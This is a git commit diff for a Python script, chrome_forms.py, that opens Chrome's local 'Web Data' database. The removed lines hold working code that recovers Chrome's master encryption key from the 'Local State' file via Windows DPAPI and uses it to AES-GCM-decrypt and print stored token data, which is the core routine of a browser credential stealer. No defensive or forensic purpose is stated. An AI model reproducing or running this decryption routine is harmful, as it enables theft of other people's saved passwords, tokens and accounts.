b3b1da88573785e22ab93e02e6a722a47655dbf7
Joseph Merigala <joseph.merigala@gmail.com>
2024-08-20 09:44:38 +0530

    V0.5.5.2 refactor dir

--- chrome_forms.py
+++ chrome_forms.py
@@ -11,26 +11,6 @@ db = os.path.expandvars("%LOCALAPPDATA%/Google/Chrome/User Data/Default/Web Data
 connection = sqlite3.connect(db)
 cursor = connection.cursor()
 
-def get_chrome_pass_master_key():
-    db = os.path.expandvars('%LOCALAPPDATA%/Google/Chrome/User Data/Local State')
-    f_obj = open(db,'rb')
-    data = f_obj.read()
-    f_obj.close()
-    
-    temp = json.loads(data.decode())    
-    protected_enc_key = base64.b64decode(temp['os_crypt']['encrypted_key'])
-    protected_enc_key = protected_enc_key[5:]
-    unprotected_enc_key = win32crypt.CryptUnprotectData(protected_enc_key)
-    unprotected_enc_key = unprotected_enc_key[1]
-    return unprotected_enc_key
-
-def parse_token_service(data):
-    masterkey = get_chrome_pass_master_key()
-    for line in data:
-        buffer = data[1]
-        iv = buffer[3:15]
-        cipher = AES.new(masterkey, AES.MODE_GCM, iv)
-        print(cipher.decrypt(buffer[15:]))
 
 
 cursor.execute("SELECT * FROM sqlite_master WHERE type='table';")
